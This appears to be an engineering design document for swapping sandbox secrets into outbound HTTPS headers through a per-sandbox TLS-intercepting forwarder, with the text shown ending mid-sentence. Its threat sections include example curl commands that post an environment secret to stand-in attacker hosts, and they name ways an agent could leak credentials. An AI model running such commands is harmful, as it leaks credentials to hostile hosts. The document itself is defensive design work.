# Sandbox secret swap via MITM egress

## Context

Today, sandbox env vars defined in the workspace admin (`WorkspaceSandboxEnvVar`)
are injected into the agent process at sandbox boot in plaintext. The agent UID
(`agent-proxied`, UID 1003) holds the real secret in its environment, which
makes the secret recoverable by any code path that touches the env: tool
stdout, file writes, network calls to allowlisted domains, transformed/encoded
echoes, or LLM social engineering.

The current mitigation is `formatExecOutput` (PR #25051), which scans tool
stdout for high-entropy substrings and replaces them with redaction markers.
The PR description openly acknowledges what it doesn't catch: encoded output,
network calls from sandbox code, transformed values, dictionary-like values.
An agent doing `curl -X POST https://attacker.com -d "$DST_FOO"` walks past
redaction and is only stopped by the egress domain allowlist.

The set of upstreams the sandbox can reach is broad: the global default
allowlist merged with per-workspace and per-sandbox policies stored in the GCS
policy bucket. Workspaces add their own domains (Slack, Stripe, GitHub,
internal APIs) via `add_egress_domain` and the workspace admin UI. So "an
allowlisted but unrelated domain receives the secret" is a realistic exfil
path.

## Goals

- The agent process never holds the real secret. Its environment contains a
  deterministic, opaque placeholder.
- The placeholder is substituted with the real value just-in-time, on the
  request path leaving the sandbox, before bytes hit the upstream.
- The substitution is gated on a per-secret destination allowlist, so the
  secret is only released to upstreams the admin has explicitly approved for
  that secret.
- The mechanism is transparent to the default HTTPS client of every
  mainstream language (curl, Python, Node, Bun, Deno, Go, Java, Ruby, PHP,
  Rust with native-tls). Most clients work without code changes; SDKs
  that auto-discover env vars by exact name (OpenAI, Stripe, etc.) need
  a one-line aliasing snippet because secrets are exposed under a
  dedicated `DSEC_*` prefix (see Phase 1 spec for the rationale).
- The real secret value is never forwarded to a destination outside the
  matching secret's `allowedDomains`. This is the load-bearing security
  invariant.
- The placeholder itself is an opaque random nonce; whether it reaches a
  given destination is not security-sensitive (it reveals nothing about
  the secret's value, length, or name). On MITM-scoped domains where
  dsbx observes a recognized placeholder going to a destination not in
  that secret's `allowedDomains`, dsbx drops the connection (loud
  failure on the surface where it can act). On non-MITM domains the
  placeholder may be forwarded as-is - this is acceptable because no
  real value is at risk.
- Failure modes that *are* loud: TLS verification errors when the
  agent's client doesn't trust dsbx's leaf, connection drops on
  placeholder-to-disallowed, upstream auth errors when a transformed
  placeholder fails to substitute and reaches upstream as garbage.

## Non-goals

- Defending against a sandbox-VM root compromise. The sandbox VM remains a
  single-tenant VM trusted to hold per-sandbox secrets, bounded by the egress
  proxy. Kernel/container escape is out of scope, the blast radius is the
  same as today's plaintext env.
- Defending against cert-pinning clients. By design, a client that pins a
  specific CA or leaf will refuse the dsbx-forged leaf and fail to connect.
  This is correct behavior and we don't try to work around it.
- Substituting secrets in non-HTTP protocols (Postgres TLS, Redis TLS, raw
  TLS sockets). The 80/20 case is HTTPS APIs with header-based auth.

## Proposal

Place the MITM in `dsbx`, the per-sandbox forwarder we already run as root.
Generate an ephemeral CA at sandbox boot, terminate the agent's outbound
TLS in dsbx, rewrite HTTP request headers containing the placeholder, and
re-encrypt outbound to the upstream (still tunneled through the central
egress proxy). The central egress proxy keeps doing TCP splice; no MITM
state lives there.

Phase 1 ships **headers only**. URL substitution (placeholder appearing
in the request line) is deferred to Phase 2. Body substitution is
deferred to Phase 3. **WebSockets are part of MVP**: upgrade-request
headers are substituted under the normal HTTP/1.1 rules in Phase 1,
post-101 frames are byte-spliced in Phase 1 so MITM-scoped WS
connections don't break, and in-frame substitution lands in Phase 3
alongside body substitution (same `includeBody` opt-in, same
machinery). See "Phases" below for the full sequencing.

### Why dsbx and not the central egress proxy

| Property | dsbx (chosen) | Central egress proxy |
| --- | --- | --- |
| Real secret lives in | sandbox VM tmpfs, root-only (0600) | proxy pod only |
| CA private key blast radius | per-sandbox-VM on tmpfs (root 0600, RAM-backed) | one CA signs leaves for every domain in every workspace |
| TLS terminations on the path | one extra (dsbx) | one extra (proxy) |
| Code change weight | one binary (~1000-1500 LOC including tests) | proxy + secret store + CA mgmt + per-conn key fetches on a regional hot path |
| Agent reach to real secret | requires sandbox root escape | impossible from sandbox |

The central-proxy variant has nicer "secret never enters the VM" properties
but the CA-private-key concentration is a tier-1 secret backing every
workspace's outbound TLS, the proxy turns from a thin TCP splice into a full
HTTP/1.1+HTTP/2+websocket parser with body buffering and Content-Length
recomputation, and the per-connection secret fetches add latency to every
egress. The dsbx variant accepts that a sandbox-root escape leaks that
sandbox's secrets, same blast radius as today's plaintext env vars for
those secrets, in exchange for a much smaller and more localized
implementation.

### Placeholder format

```
__DSEC_<32 hex chars>__
```

where the hex is a 16-byte random nonce, generated **once** when the
secret row is created and stored on the row as `placeholderNonce`.

**The nonce is stable for the life of the secret.** It does not change
on value rotation. It does not change on `allowedDomains` edits. The
only thing that "ends" the nonce is deletion of the secret row, after
which the nonce is never reused (a recreated secret with the same name
gets a fresh random nonce).

Why a stable nonce: the placeholder is an opaque alias. Substitution
fires when dsbx observes the placeholder *and* the request destination
is in the secret's allowedDomains *and* the sandbox has the secret
provisioned in `/run/dust/egress-secrets.json`. Whether the placeholder
string itself rotates buys us nothing security-wise:

- An attacker who exfiltrates a placeholder can't use it: they don't
  have a sandbox provisioned with the secret, so substitution never
  fires for them.
- A persisted script (the agent saved a notebook with the placeholder
  embedded) keeps working after a value rotation - it picks up the new
  value via dsbx without any agent-side change, which is the right UX.

A random nonce is unforgeable by construction and reveals nothing about
the underlying secret.

Properties:

- Fixed width, alphanumeric: safe to embed in shell, JSON, headers, URLs.
- Greppable regex: `__DSEC_[0-9a-f]{32}__`.
- Stable for the life of the secret row. Rotation of the value, edits
  to `allowedDomains`, and any other in-place change keep the same
  nonce. Only deletion ends the nonce.
- Workspace-scoped identity: a given secret has the same placeholder in
  every sandbox of the workspace it belongs to. A persisted placeholder
  replayed from sandbox A to sandbox B of the same workspace will
  substitute correctly, which is fine - the secret is a workspace-level
  authority, and an agent in sandbox B is already authorized to use any
  secret the workspace's admin granted access to. Cross-workspace replay
  is impossible (different nonce).
- No information leakage: random bytes reveal nothing about the secret,
  its length, or any predictable structure the agent could forge.

### Substitution logic

In dsbx, branch by port in `handle_connection`. The MITM stage is
**scoped to the union of all configured secrets' `allowedDomains`**:
dsbx terminates TLS only when the SNI matches a domain that some secret
is allowed to be released to. All other 443 traffic stays on the
existing TCP-splice path, so cert-pinned and mTLS clients to non-secret
domains are unaffected.

- **Port 443 (HTTPS), SNI in allowlist union**: Peek SNI. Forge a leaf
  cert for the SNI signed by the in-process CA. Terminate inbound TLS
  on dsbx with that leaf. Open outbound TLS toward the real upstream
  (still tunneled through the central egress proxy on 4443). On the
  decrypted inner stream, if the protocol parses as HTTP/1.1 or HTTP/2
  (per ALPN), run the header rewriter. Substitution applies only to
  header values in Phase 1; if a placeholder appears in the request
  line (URL path/query) dsbx drops the connection (URL substitution
  is Phase 2). If a recognized placeholder appears on a non-allowed
  domain, drop. Otherwise re-encrypt outbound.
  If the inner protocol is *not* HTTP/1.1 or HTTP/2 (e.g. Postgres TLS
  on a MITM-scoped domain), the bytes are re-encrypted and forwarded
  unchanged: dsbx doesn't substitute and doesn't scan for the
  placeholder. Substitution requires HTTP framing; non-HTTP traffic on
  a MITM-scoped domain is rare in practice and the worst case is the
  agent forwarding a placeholder as garbage to an upstream that already
  trusts the agent.
- **Port 443, SNI not in allowlist union**: TCP-splice as today. No
  TLS termination, no inspection. Placeholder-bearing requests to such
  domains forward the placeholder unchanged - acceptable because the
  placeholder is an opaque nonce.
- **Port 80 (HTTP)**: Terminate TCP, run an HTTP/1.1 parser
  (`httparse`), scan for the placeholder. **Drop on match.** Never
  substitute on plaintext HTTP - doing so would put the real secret on
  the open internet between the central egress proxy and upstream.
  Non-secret port-80 traffic continues to work.
- **Other ports / raw TCP**: not addressed by this design. The central
  egress proxy already denies non-HTTP/non-HTTPS connections from the
  sandbox (it requires a domain extracted at dsbx peek time, and dsbx
  only extracts domains for 80/443). Raw-TCP behavior, if ever needed,
  is a separate design.

Substitution is gated on a per-secret destination allowlist:

```
secret.allowedDomains: string[]   // e.g. ["api.openai.com", "*.googleapis.com"]
```

Wildcards are supported following the same shape as the workspace egress
policy: a leading `*.` matches any single-or-multi-label subdomain
(`*.googleapis.com` matches `storage.googleapis.com` but not
`googleapis.com` itself). Wildcard secrets broaden the MITM scope to
whatever resolves under the wildcard - admins should pick the narrowest
pattern that covers the use case.

The substitution gate requires three things to agree on a domain in the
secret's `allowedDomains`:

1. The TLS SNI used at handshake time.
2. The HTTP `Host:` header (h1) or `:authority:` pseudo-header (h2).
3. (When present) the absolute-form request URI authority.

If they all agree on an allowed domain, dsbx replaces the placeholder
with the real value. If a recognized placeholder appears but the
destination is **not** in the matching secret's `allowedDomains`, or the
SNI/Host/`:authority:` disagree, dsbx **drops the connection** and
records a structured deny-log event with the secret name, the SNI, and
the disagreeing Host/authority. (This drop applies on the MITM-scoped
surface where dsbx terminates TLS and can see the placeholder. On
non-MITM domains the placeholder may be forwarded as-is; that's
acceptable per the goals because the placeholder is opaque and reveals
nothing about the secret.)

This is the security-critical control. It stops `curl
https://attacker-allowlisted-by-egress-policy.com -H "X: $DST_FOO"`
even when that domain is on the egress allowlist for some unrelated
reason, and it closes the SNI/Host confused-deputy variant where the
agent opens TLS to an allowed domain but inserts `Host:` for a
different one. The per-secret allowlist is stricter than (and orthogonal
to) the egress domain policy.

### Substitution scope: headers in Phase 1

Phase 1 covers **HTTP request headers only**. URL substitution
(placeholder in path/query) is deferred to Phase 2. Body substitution
(OAuth `client_secret`, webhook payloads, multipart forms) is deferred
to Phase 3 with an `includeBody` flag on each secret row.

What's covered in Phase 1:

- Secrets used **literally** as a header value, e.g.
  `Authorization: Bearer __DSEC_<hex>__`, `X-API-Key: __DSEC_<hex>__`,
  `Cookie: session=__DSEC_<hex>__`.
- **HTTP Basic auth**: when dsbx sees a header line `Authorization:
  Basic <token>`, it base64-decodes `<token>`, scans the decoded bytes
  for the placeholder under the same gate as literal headers (SNI/Host
  agreement on a domain in the secret's `allowedDomains`), substitutes,
  re-encodes base64, and emits a new header line. Works for both
  patterns the agent might use:
  `base64("user:__DSEC_<hex>__")` (username + secret password) and
  `base64("__DSEC_<hex>__:")` (API-key-as-Basic). Cheap because the
  format is fixed and the placeholder alphabet survives base64 cleanly.
  Fail-soft: if the value isn't valid base64, the header passes through
  unchanged and fails upstream as a normal auth error.

What's **not** covered in Phase 1 (failure mode in parens):

- **HMAC-signed** flows (Stripe webhooks, GitHub webhook signing,
  custom HMAC schemes): the secret is the HMAC key, never on the
  wire. dsbx has no placeholder to find, the signature computed
  against the placeholder doesn't validate, upstream rejects.
- **AWS SigV4** and similar request-signing protocols: secret is the
  signing key, same shape as HMAC. Upstream auth rejects.
- Any flow where the agent **transforms** the placeholder before sending
  in shapes other than Basic-auth-base64 (urlencode, JWT-sign, split
  across headers, write to a file then re-read): substitution doesn't
  fire, upstream gets garbage.

In all of these cases dsbx forwards whatever the agent produced
unchanged (the placeholder isn't recognized, or the secret never
appears on the wire to begin with). The upstream then sees garbage
where it expected a credential and rejects with a 401-class error.
That's an upstream property, not a guarantee dsbx provides; from
our system's perspective the request just passes through. The
agent observes a normal auth failure.

The skill prompt warns the agent that HMAC/SigV4 will not work yet.
The admin UI surfaces the same limit at create-secret time. Richer
auth shapes (HMAC, SigV4) get revisited in Phase 4+ via an explicit
per-secret `format` field (`hmac-sha256 | sigv4 | ...`) that tells
dsbx how to apply the secret. We are explicitly **not** designing
that now.

### CA lifetime and dsbx restarts

The MITM CA is **per-sandbox-VM**, not per-dsbx-process. dsbx generates
the CA cert + private key on first start of a sandbox VM and persists
both to **tmpfs** at `/run/dust/egress-ca.pem` (cert, root 0644 so the
boot script can install it into the system trust store; the agent UID
can read it but doesn't need to) and `/run/dust/egress-ca.key` (key,
root 0600, never readable by the agent UID). On any subsequent dsbx
restart within the same sandbox VM, dsbx reads the existing CA from
tmpfs and reuses it.

Why this matters: `tools/index.ts` can restart the dsbx forwarder on
health failure, and trust env vars like `NODE_EXTRA_CA_CERTS` and the
Java keystore are read at process startup only. If dsbx rotated the CA
on restart, every agent process that started against the old CA would
silently fail to verify dsbx's leaf going forward. Persisting on tmpfs
keeps the CA stable for the VM's lifetime.

Why tmpfs and not disk: tmpfs is RAM-backed and never hits durable
storage, so the security property of "key never on disk" still holds.
Combined with our invariant that the agent UID never escalates to root,
the agent has no path to read the key (root-only file permissions), and
the key never survives a sandbox VM teardown.

### Client-language agnosticism

The interception is below the language runtime:

- nftables `REDIRECT` keys on `meta skuid 1003` at the kernel netfilter
  hook. Every `connect()` from the agent UID is rerouted to dsbx
  regardless of libc, runtime, or static linkage.
- The byte-level rewriter inside dsbx parses wire bytes after TLS
  termination; it doesn't introspect the client.
- DNS for the agent UID is pinned to configured resolvers via nftables;
  DoH/alternative resolvers fail closed.
- UDP/ICMP from UID 1003 is dropped, so HTTP/3/QUIC silently falls back
  to HTTP/2 on TCP.

The only runtime-specific surface is **TLS trust**. For dsbx's forged
leaf to be accepted, the agent's HTTPS client must trust the dsbx-issued
local CA. Different stacks read trust roots from different places, and
trust env vars have different semantics, some replace the trust bundle
entirely, others append. Misconfiguring this silently breaks non-MITM TLS
to public sites.

In practice, **HTTPS coverage on Linux is broad** for any tool the
agent UID runs that uses standard TLS libraries. Once the dsbx CA is
installed into the system trust store via `update-ca-certificates` and
the env-var matrix below is applied, the verified-as-of-design list
below picks up the CA without code changes. The smoke matrix
(§ "Verification") is the source of truth; the prose below is the
hypothesis we plan to verify per release.

Verified by the smoke matrix: curl, wget, openssl s_client, Python
(`urllib`, `requests`, `httpx`), Node (`fetch`, `https`), Bun, Deno,
Go (`net/http`), Java (post-keytool), Ruby (`Net::HTTP`), PHP
(`file_get_contents`), git over HTTPS, AWS CLI.

Known holes (matrix exceptions):

- **Rust `rustls-webpki`**: hardcoded Mozilla bundle compiled into
  the binary, no env var reaches it.
- **JVM when the boot-time keytool import didn't land in the
  keystore the running JDK reads.** Java doesn't honor
  `SSL_CERT_FILE` / `NODE_EXTRA_CA_CERTS` / etc.; the only way to
  add a CA is to mutate `$JAVA_HOME/lib/security/cacerts` via
  `keytool -importcert`. The boot script runs that import
  (see § "Client-language agnosticism" → step 4), and "Java
  (post-keytool)" in the smoke matrix verifies the happy path.
  Failure shows up if a JDK gets installed mid-session (the new
  JDK has an untouched `cacerts`), if the image carries multiple
  JDKs and the running one isn't the one we imported into, or if
  agent code passes `-Djavax.net.ssl.trustStore=...` pointing at
  a different keystore. Failure mode is a clean `PKIX path
  building failed` TLS error, no silent leak.
- **Cert-pinning clients**: by design, they reject the dsbx leaf.
- **mTLS clients**: dsbx terminates the agent's TLS and opens a
  fresh outbound TLS without forwarding any client cert, so client-
  auth flows fail at the upstream's handshake.

Tools we expect to work but don't currently exercise in the smoke
matrix (treat as hypothesis until verified): apt/pip/npm/cargo/yarn
package fetches, gcloud, kubectl, helm, httpie. SSH-based tools (scp,
rsync over ssh) are unaffected by the MITM either way - they don't
use TLS.

| Stack | System store | Env knob | Knob semantics |
| --- | --- | --- | --- |
| curl / wget / OpenSSL CLIs | yes | `CURL_CA_BUNDLE`, `SSL_CERT_FILE` | replace |
| Go (`crypto/tls` on Linux) | yes | `SSL_CERT_FILE`, `SSL_CERT_DIR` | replace |
| Ruby, PHP, Perl | yes | `SSL_CERT_FILE` | replace |
| Python `ssl` stdlib | yes | `SSL_CERT_FILE` | replace |
| Python `requests` | no | `REQUESTS_CA_BUNDLE` (falls back to `CURL_CA_BUNDLE`) | replace |
| Python `httpx` | no | `SSL_CERT_FILE` / `SSL_CERT_DIR` | replace |
| Node.js | no | `NODE_EXTRA_CA_CERTS` | append (startup only) |
| Bun | no | `NODE_EXTRA_CA_CERTS` (verify) | append (claimed) |
| Deno | no | `DENO_CERT` + `DENO_TLS_CA_STORE` | append |
| Rust `reqwest` (rustls-webpki) | no | none | not configurable |
| Rust `reqwest` (native-tls / rustls-native-certs) | yes | `SSL_CERT_FILE` | replace |
| Java / JVM | no | none | keystore `keytool -import` at boot |
| AWS SDKs | no | `AWS_CA_BUNDLE` | replace |
| Git over HTTPS | yes | `GIT_SSL_CAINFO` | replace |

Source notes: Requests respects `REQUESTS_CA_BUNDLE` first, then falls
back to `CURL_CA_BUNDLE` (Requests advanced docs), not `SSL_CERT_FILE`.
HTTPX uses `SSL_CERT_FILE`/`SSL_CERT_DIR` (HTTPX environment-variables
docs). Node reads `NODE_EXTRA_CA_CERTS` at process start only (Node CLI
docs).

The replace/append distinction drives the trust setup. The sandbox image
maintains two files and points each env var at the right one:

1. **Install the dsbx-issued CA into the system store** at boot:
   ```
   cp /run/dust/egress-ca.pem /usr/local/share/ca-certificates/dust-egress.crt
   update-ca-certificates
   ```
2. **Maintain `/etc/dust/ca-bundle.pem` = system bundle ∪ dust-egress
   CA**, computed at boot from `/etc/ssl/certs/ca-certificates.crt`. This
   is what replace-style env vars point at.
3. **Export env vars system-wide** in `/etc/environment` and the agent
   user's profile. Replace-style vars get the bundle; append-style vars
   get the single-CA file:
   ```
   # replace-style, must contain the full trust set
   SSL_CERT_FILE=/etc/dust/ca-bundle.pem
   SSL_CERT_DIR=/etc/ssl/certs
   CURL_CA_BUNDLE=/etc/dust/ca-bundle.pem
   REQUESTS_CA_BUNDLE=/etc/dust/ca-bundle.pem
   AWS_CA_BUNDLE=/etc/dust/ca-bundle.pem
   GIT_SSL_CAINFO=/etc/dust/ca-bundle.pem

   # append-style, single CA, added to the runtime's built-in bundle
   NODE_EXTRA_CA_CERTS=/run/dust/egress-ca.pem
   DENO_CERT=/run/dust/egress-ca.pem
   DENO_TLS_CA_STORE=system,mozilla
   ```
4. **Java keystore import at boot** (the CA is per-sandbox-VM):
   ```
   keytool -importcert -noprompt -trustcacerts \
     -alias dust-egress -file /run/dust/egress-ca.pem \
     -keystore "$JAVA_HOME/lib/security/cacerts" -storepass changeit
   ```
5. **Boot order**: dsbx starts and writes the CA → env exports happen →
   the agent gets to spawn anything. `NODE_EXTRA_CA_CERTS` is read at
   process startup only, so processes spawned before the env is set
   don't pick it up. This is the same ordering already used for the
   JWT/forwarder setup.
6. **Skill prompt guidance**: instruct the agent not to override trust
   in code (no `verify=` on requests/httpx, no `ca:` on Node, no custom
   `RootCAs` in Go, no private trust managers in Java). If it does, the
   call fails because dsbx's leaf isn't trusted. The
   placeholder-unsubstituted event surfaces in the deny log to avoid
   silent debugging spirals.

### Known limits, by design

- **Rust `reqwest` against `webpki-roots`**: hardcoded Mozilla bundle
  compiled into the binary, no env var reaches it. Mitigation: pre-seed
  `~/.cargo/config.toml` to favor `rustls-native-certs`, or document and
  let it fail loudly. No silent secret leak.
- **Cert-pinning clients**: by design, they reject the dsbx leaf. We
  don't try to MITM a pinning client. Empirically rare in agent-written
  code.
- **mTLS / client-cert auth on MITM-scoped domains**: dsbx terminates
  the agent's TLS and opens a fresh outbound TLS to the upstream
  without forwarding any client certificate. Any flow that authenticates
  via mTLS to a domain in the secret-allowlist union will fail at the
  upstream's client-auth handshake. mTLS to non-MITM domains
  (TCP-spliced, dsbx never terminates) is unaffected. If mTLS to a
  secret domain is ever needed, dsbx would have to extract the agent's
  client cert and re-present it on the outbound side - significant
  complexity, deferred indefinitely.
- **Long-lived processes started before env export**: don't pick up the
  trust. Boot order is enforced.
- **Non-HTTP protocols over TLS** (Postgres, MySQL, Redis, SMTP STARTTLS,
  raw TLS): dsbx terminates inbound TLS but the rewriter only understands
  HTTP/1.1 and HTTP/2. The placeholder reaches upstream and is rejected
  as garbage. Per-protocol rewriters are Phase 3+, opt-in by domain.
- **HTTP/3 / QUIC**: UDP is already dropped for UID 1003. Clients fall
  back to HTTP/2 on TCP. Preserved.
- **Encoded placeholders**: if the agent base64s, url-encodes, or splits
  the placeholder across headers, the rewriter doesn't recognize it and
  doesn't substitute. Upstream gets garbage. This is a feature: any
  transformation breaks substitution and the secret is never produced.

### Verification

A smoke matrix runs per stack on every dsbx release: one MITM'd domain
(placeholder must materialize as the real secret upstream), one non-MITM
public domain (TLS must still verify against the public web).

```
# baseline
curl https://api.allowed-mitm.example/   # MITM → real secret in headers
curl https://www.google.com/             # non-MITM → must verify

# Python
python -c "import urllib.request; urllib.request.urlopen('https://...')"
python -c "import requests; requests.get('https://...')"
python -c "import httpx; httpx.get('https://...')"

# JS runtimes
node -e "fetch('https://...').then(r=>r.text())"
bun  -e "fetch('https://...').then(r=>r.text())"
deno eval "await fetch('https://...')"

# Compiled
go run /tmp/get.go                                 # net/http
java GetURL                                        # post-keytool
cargo run                                          # reqwest+native-tls
cargo run                                          # reqwest+rustls-webpki, EXPECTED FAIL

# Misc
ruby -rnet/http -e "Net::HTTP.get(URI('https://...'))"
php -r "file_get_contents('https://...');"
git clone https://github.com/...
aws s3 ls
wget https://...
```

Each case asserts the public domain succeeds and the controlled MITM
upstream records the real secret in the captured `Authorization` header.

## Phases

### Phase 0, minimal end-to-end PoC (this PR)

Purpose: prove the substitution path works end-to-end before investing in
the full design. If Phase 0 works, every load-bearing claim, kernel-level
REDIRECT, dsbx TLS termination with an ephemeral CA, byte rewriting,
re-encryption surviving the central proxy splice and upstream TLS,
observable arrival upstream, is demonstrated.

In scope:

- Hard-coded substitution in dsbx:
  ```
  __DUST_EXPERIMENT_PLACEHOLDER__   →   __SUCCESSFULLY_REPLACED________
  ```
  Both 31 bytes (including leading/trailing `__`). Equal length avoids
  HTTP framing complications.
- HTTP/1.1 request headers only. No response rewriting, no body, no URL,
  no HTTP/2.
- Substitution is unconditional when the placeholder is present. No
  `allowedDomains`, no per-secret table, no JWT cross-check.
- TLS MITM via ephemeral in-memory CA generated at dsbx startup.
- Trust setup limited to `update-ca-certificates` plus `SSL_CERT_FILE`
  and `CURL_CA_BUNDLE` pointing at `/etc/dust/ca-bundle.pem`. curl is
  the only client used in Phase 0.
- New endpoint on `front`: `POST/GET /api/v1/w/[wId]/sandbox/egress-experiment`,
  gated by a shared bearer token in `X-Dust-Experiment-Token`. Returns
  `404` unless both `EGRESS_MITM_EXPERIMENT_HOST` and
  `EGRESS_MITM_EXPERIMENT_TOKEN` are set; `401` on missing/wrong token.
  Logs the inbound `X-Dust-Experiment` header to Datadog and echoes it
  back. No DB writes.
- Smoke flow runnable from inside the sandbox. The shared token is
  injected as `$DUST_EXPERIMENT_TOKEN` whenever the experiment is
  enabled:
  ```
  curl -H "X-Dust-Experiment: __DUST_EXPERIMENT_PLACEHOLDER__" \
       -H "X-Dust-Experiment-Token: $DUST_EXPERIMENT_TOKEN" \
       https://<experiment-host>/api/v1/w/<wId>/sandbox/egress-experiment
  ```
  Expected: Datadog log `received == "__SUCCESSFULLY_REPLACED________"`.
- Control case: literal non-placeholder header value passes through
  unchanged.

Out of scope for Phase 0:

- DB schema changes, model migrations, admin UI.
- Changes to the existing `WorkspaceSandboxEnvVar` flow.
- The random-nonce `__DSEC_<32hex>__` format.
- The `/run/dust/egress-secrets.json` per-sandbox file.
- CA persistence on tmpfs (Phase 0 regenerates on dsbx start; if
  `tools/index.ts` restarts dsbx mid-experiment the trust bundle goes
  stale - acceptable for a controlled smoke test, not for production).
- `allowedDomains` gating, deny-log enrichment.
- Trust coverage beyond curl (Node, Python, Java, Rust, Bun, Deno, Go).
- HTTP/2, body rewriting, URL rewriting, websocket Upgrade, non-HTTP
  protocols, plain HTTP on port 80.
- Any change to the central egress proxy.

Acceptance criteria:

1. `curl` with the placeholder reaches the endpoint and Datadog shows
   the substituted value.
2. `curl` with a literal non-placeholder string reaches the endpoint
   unchanged.
3. A non-MITM `curl https://www.google.com/` from the same sandbox
   still succeeds (sanity for the trust bundle).
4. The dsbx MITM stage is scoped to the experiment domain so unrelated
   production traffic isn't intercepted.

Implementation footprint:

- `cli/dust-sandbox`: ~200-400 LOC plus tests. Ephemeral CA via `rcgen`,
  per-SNI leaf signing with an LRU cache, single-rule substring replacer
  on HTTP/1.1 request headers, scoped to the experiment hostname.
- `front`: ~50-100 LOC. One endpoint file (marked `@ignoreswagger`
  because it's intentionally undocumented and disappears with Phase
  0), one functional test.
- Sandbox image: ~20 lines in the boot sequence to install the CA and
  point `SSL_CERT_FILE`/`CURL_CA_BUNDLE` at the merged bundle.
- Central egress proxy: no change.

### Two classes of sandbox env vars

The `WorkspaceSandboxEnvVar` model splits into two distinct classes,
with different semantics and different injection paths:

1. **Config vars** (the `WorkspaceSandboxEnvVar` of today). Plain
   strings meant to be used offline inside the sandbox: feature flags,
   non-sensitive config, default region, etc. Injected as-is into the
   agent env. Not substituted on the wire. Not bound to a domain. The
   bash-output redactor still applies to these (best-effort, since
   they're in env in plaintext).
2. **Secrets** (new). Sensitive values meant to be used in HTTPS
   requests only, scoped to a per-secret `allowedDomains` list. The
   agent env contains only the placeholder; the real value lives in
   `/run/dust/egress-secrets.json` (tmpfs, root-owned 0600) as
   plaintext, and is substituted on the wire by dsbx when the
   destination domain matches the secret's allowlist. Cannot be used
   offline (no real value in env).

   File schema (one record per secret):

   ```json
   [
     {
       "name": "DSEC_OPENAI_API_KEY",
       "placeholder": "__DSEC_<32hex>__",
       "value": "sk-...",
       "allowedDomains": ["api.openai.com"]
     }
   ]
   ```

   Storage rationale: plaintext on tmpfs, root-owned. Same posture as
   the CA private key. dsbx needs the cleartext to substitute, so any
   encryption layer would require a decryption key that lives somewhere
   root-readable inside the sandbox VM anyway. Under the "agent UID
   never escalates to root" invariant, root-only tmpfs is sufficient.
   tmpfs is RAM-backed and never hits durable storage.

Admins pick the class when creating the row. Migration path for
existing rows: leave them as config vars by default; admins explicitly
promote sensitive ones to secrets and set `allowedDomains` at promotion
time.

### Phase 1, MVP - HTTP/1.1

- HTTP/1.1 only on port 443 (force HTTP/1 via ALPN), **headers only**.
  URL substitution (placeholder appearing in the request line / Path-
  and-Query) is deferred to Phase 2 because URL-context encoding rules
  (reserved chars, percent-encoding, ambiguity around `+` vs `%20`)
  haven't been worked out. dsbx scans the request line in Phase 1 and
  drops the connection if a placeholder appears there (loud failure;
  agent learns the URL path isn't supported and uses headers).
- Random-nonce `__DSEC_<32hex>__` placeholder. Each secret row has
  a 16-byte `placeholderNonce` column generated **once at row create
  time**. The nonce is stable for the life of the row - rotation of
  the value and edits to `allowedDomains` do **not** change the nonce.
  Only deletion ends the nonce. Sandboxes that hold the placeholder
  string in env continue to work after a value rotation without any
  env refresh: on the next wake, front rewrites the secrets file with
  the new value, the same placeholder substitutes to the new value.
  (Push-to-active-sandbox propagation lands in a later phase, see
  "Live update / rotation" below.)
- **MITM scope = allowlist union**: dsbx terminates TLS only when the
  SNI matches a domain in some configured secret's `allowedDomains`
  (exact match or leading-`*.` wildcard). Other 443 traffic stays on
  the existing TCP-splice path. The allowlist union is computed by
  `front` at sandbox boot and shipped in
  `/run/dust/egress-secrets.json`.
- **Full HTTP/1.1 message loop in the rewriter**, not the Phase 0
  "first-headers + raw-copy" shape. Every request on a keep-alive
  connection is parsed individually, Host/`:authority:` validated
  per-request, substituted, and re-emitted. Pipelined requests are
  handled. The rewriter fails closed (drops the connection) on
  malformed, oversized, or truncated headers, response-side framing
  errors, or any header-section anomaly. This is the right Phase 1
  cost; carrying Phase 0's prefix-only rewriter would be unsafe on
  keep-alive connections.
- **HTTP Basic auth** (`Authorization: Basic <base64>`). dsbx
  recognizes the header, base64-decodes the value, scans the
  decoded bytes for the placeholder, substitutes if found (under
  the same SNI/Host/allowedDomains gate as literal headers),
  re-encodes base64, and emits the rewritten header. Fail-soft on
  invalid base64 (header passes through unchanged). Small,
  bounded code path; does not generalize to HMAC/SigV4 (those
  remain Phase 4+).
- **WebSocket upgrade handling**. The upgrade request itself is
  HTTP/1.1 and goes through the normal rewriter, so
  `Authorization`/`x-api-key`/`Sec-WebSocket-Protocol` placeholders
  in the upgrade headers substitute correctly. When dsbx observes
  the upstream answering `101 Switching Protocols`, it **switches
  that connection into bidirectional byte-splice mode** for the
  remainder, no further parsing. This keeps MITM-scoped websocket
  APIs working in Phase 1 (Anthropic streaming, OpenAI Realtime,
  anything that authenticates in the upgrade). In-frame
  substitution (the case where the agent sends a JSON auth payload
  in the first frame) is **not** in Phase 1, see Phase 3.
- **Substitution gate**: SNI + HTTP `Host:` (h1) + h2 `:authority:`
  must all agree on a domain in the matching secret's `allowedDomains`.
  On a recognized placeholder with disagreement (or destination not in
  the secret's allowlist), dsbx drops the connection on the MITM-scoped
  surface and emits a structured deny-log event including the secret
  name, SNI, and disagreeing Host/authority.
- **Secret value validation, two layers**:
  - Admin UI: reject values containing CR (`\r`), LF (`\n`), NUL
    (`\0`), or other ASCII control characters at create/update time.
    Max length 8KB to stay well below typical header-line limits.
    Closes the CRLF-injection primitive at the source (admin can't
    set a value that, once substituted, smuggles a header).
  - dsbx: defense in depth. At substitution time, if the cleartext
    value contains any of the same forbidden bytes, refuse to
    substitute and drop the connection with a deny-log event. This
    catches anything that bypasses admin UI (direct DB writes, future
    code paths).
- **CA persisted on tmpfs**: dsbx writes the per-sandbox-VM CA to
  `/run/dust/egress-ca.{pem,key}` on first start; reuses on restart.
  Key is root-owned 0600. Cert is root-owned 0644 so the boot script
  can install it into the system store.
- `WorkspaceSandboxEnvVar` split into config vars and secrets (see
  above). Secrets gain `allowedDomains: string[]` and `placeholderNonce`.
- `front` writes `/run/dust/egress-secrets.json` (tmpfs, root-owned
  0600) at sandbox provisioning **and on the wake path** (before any
  agent code runs after a paused sandbox resumes). The file is
  plaintext with the schema documented above (`name`, `placeholder`,
  `value`, `allowedDomains`). dsbx reads the file on every startup
  (initial and any subsequent restart by `tools/index.ts`
  health-recovery) from the same path.

- **How `front` writes the file** (root-owned 0600, atomic, no
  user-readable temp window):

  The current `SandboxResource.writeFile` delegates to E2B's
  `sandbox.files.write`, which doesn't expose ownership/mode controls
  and lands the file as the default sandbox user. That's not
  acceptable for a file holding plaintext secrets - the agent UID
